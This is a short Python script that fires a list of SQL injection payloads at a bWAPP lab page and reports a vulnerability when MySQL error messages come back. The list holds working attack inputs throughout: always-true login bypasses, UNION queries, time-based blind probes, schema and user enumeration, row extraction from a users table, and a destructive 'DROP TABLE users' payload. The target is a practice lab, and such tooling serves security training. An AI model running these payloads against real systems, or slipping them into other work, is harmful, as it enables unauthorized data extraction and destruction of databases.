import requests

def test_sql_injection(url, payload):
    try:
        response = requests.get(url + payload)
        if "mysql_fetch_array()" in response.text or "You have an error in your SQL syntax" in response.text: #check for typical error message.
            return True #vulnerable.
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

base_url = "https://snf-3406.vlab.ac.ke/sqli_1.php?title=" #Adjust to the specific bWAPP sql injection page.

# Example SQL injection payloads:
payloads = [
    "' OR '1'='1", #Always true condition
    "'; DROP TABLE users;--", #Table deletion (dangerous!)
    "' UNION SELECT 1,2,3--", #Union based attack
    "' OR 'a'='a", #Another always true condition.
    "' AND '1'='2", #Always false condition.
    "1' OR '1'='1' --", #Numeric input bypass.
    "admin'--", #comment out rest of query.
    "1' or '1'='1", #case insensitive or.
    "1' || '1'='1", #alternative or
    "1' and '1'='2", #case insensitive and.
    "1' && '1'='2", #alternative and.
    "'\"or\"'1'='1", #escaping quotes.
    "' or 1=1--", #numeric comparison.
    "' or 'x'='x", #string comparison.
    "' or 1=1#", #using # as comment.
    "' or 'x'='x'/*", #using /* as comment.
    "' or 1=1;--", #using ; to end the query.
    "1' and sleep(5) #testing for time based injections", #time delay
    "1' and 1=benchmark(5000000,encode('hello','md5')) #testing for time based injections alternative", #time delay alternative.
    "1' and substring(@@version,1,1)=5 #version detection", #version detection
    "1' and length(database())>5 #database length detection", #database length detection
    "1' and user() like '%root%' #user detection", #user detection.
    "1' and (select count(*) from information_schema.tables where table_schema=database())>0 #table count", #table count.
    "1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '%users%' #table name", #table name.
    "1' and (select column_name from information_schema.columns where table_name='users' limit 0,1) like '%id%' #column name", #column name.
    "1' and (select data from users limit 0,1) like '%admin%' #data extraction", #data extraction.
    "1' and (select data from users where id=1) like '%admin%' #data extraction by id", #data extraction by id.
]

for payload in payloads:
    if test_sql_injection(base_url, payload):
        print(f"SQL Injection vulnerability detected with payload: {payload}")
    else:
        print(f"No SQL Injection vulnerability detected with payload: {payload}")